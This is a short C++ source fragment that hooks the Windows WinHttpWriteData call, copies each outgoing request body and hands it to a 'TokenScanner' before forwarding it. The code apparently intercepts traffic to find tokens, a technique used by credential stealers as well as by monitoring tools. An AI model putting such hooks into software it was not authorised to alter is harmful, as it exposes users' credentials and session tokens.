#include <windows.h>
#include <winhttp.h>
#include "NetHook.h"
#include "TokenScanner.h"

WinHttpWriteDataFn oWinHttpWriteData = nullptr;

BOOL WINAPI hkWinHttpWriteData(HINTERNET hRequest, LPCVOID lpBuffer, DWORD dwBytesToWrite, LPDWORD lpdwBytesWritten) {
    std::string payload(static_cast<const char*>(lpBuffer), dwBytesToWrite);
    g_scanner.Scan(payload);
    return oWinHttpWriteData(hRequest, lpBuffer, dwBytesToWrite, lpdwBytesWritten);
}